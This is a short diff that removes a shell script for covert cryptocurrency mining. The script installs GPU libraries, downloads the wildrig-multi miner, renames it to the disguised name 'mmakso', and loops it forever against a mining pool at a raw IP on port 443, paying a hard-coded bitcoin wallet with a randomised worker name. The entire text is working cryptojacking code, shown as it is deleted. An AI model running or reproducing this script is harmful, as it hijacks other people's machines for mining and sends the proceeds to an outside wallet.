@@ -1,8 +1,0 @@
-apt update && apt -y install ocl-icd-libopencl1 ocl-icd-opencl-dev clinfo curl wget sudo
-wget http://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-cuda-toolkit/libcudart12_12.0.146~12.0.1-4build4_amd64.deb && sudo dpkg -i libcudart12_12.0.146~12.0.1-4build4_amd64.deb
-curl https://github.com/andru-kun/wildrig-multi/releases/download/0.47.9/wildrig-multi-linux-0.47.9.tar.gz -L -o wildrig-multi-linux-0.47.9.tar.gz
-tar xf wildrig-multi-linux-0.47.9.tar.gz
-mv wildrig-multi mmakso
-while :; do
-./mmakso --algo qhash --url 54.160.236.68:443 --user bc1qz5r5wtgtumpv0eqyluulztpqv7dcu6fe08n8wf.$(echo $RANDOM | md5sum | head -c 10) --pass x
-done
